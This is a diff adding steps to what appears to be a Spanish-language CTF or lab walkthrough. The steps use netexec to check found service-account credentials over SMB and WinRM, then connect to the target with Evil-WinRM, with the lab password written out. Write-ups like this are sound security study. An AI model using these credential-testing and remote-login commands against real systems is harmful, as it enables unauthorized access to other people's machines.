@@ -157,3 +157,11 @@ Encontramos unas credenciales
 svc_loanmgr::Moneymakestheworldgoround!
 ```
 
+Verificamos si las credenciales son validas
+`netexec smb $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'` y nos muestra que son validas
+
+Verificamos si corresponde al grupo de Remote Management
+`netexec winrm $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`
+
+Y ahora nos conectamos con [[EVIL_WINRM]]
+
